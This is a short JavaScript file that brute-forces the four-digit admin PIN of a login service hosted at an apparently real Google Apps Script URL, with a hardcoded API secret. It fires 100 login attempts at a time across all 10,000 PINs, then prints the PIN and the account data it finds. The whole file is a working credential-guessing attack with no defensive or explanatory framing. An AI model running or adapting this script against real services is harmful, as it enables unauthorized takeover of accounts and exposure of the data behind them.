const API_URL = 'https://script.google.com/macros/s/AKfycbzMg1ilHtrHXvTboGF3K8v9AtkWyWCnEGxh_tbvb-PnGHT-vyug8o1pegN_bKUOX4B-4A/exec';
const API_SECRET = 'JANS_SECRET_2026';

async function tryLogin(loginId, password) {
  try {
    const res = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        fn: 'loginUser',
        args: [loginId, password],
        secret: API_SECRET
      })
    });
    const data = await res.json();
    const inner = data.data;
    if (data.success && inner && inner.success && inner.data && inner.data.ten) {
      return inner.data;
    }
  } catch (e) {
    // ignore
  }
  return null;
}

async function run() {
  console.log('Starting brute-force for admin PIN (0000 - 9999)...');
  const batchSize = 100;
  
  for (let i = 0; i < 10000; i += batchSize) {
    const promises = [];
    for (let j = 0; j < batchSize && (i + j) < 10000; j++) {
      const pin = String(i + j).padStart(4, '0');
      promises.push(tryLogin('admin', pin).then(userData => {
        if (userData) {
          console.log(`\n!!! FOUND ADMIN PASSWORD !!!`);
          console.log(`User: admin`);
          console.log(`PIN: ${pin}`);
          console.log(`Data: ${JSON.stringify(userData)}`);
          process.exit(0);
        }
      }));
    }
    await Promise.all(promises);
    if (i % 1000 === 0) {
      console.log(`Checked up to ${i}...`);
    }
  }
  console.log('Finished checking all 4-digit PINs. None found.');
}

run();
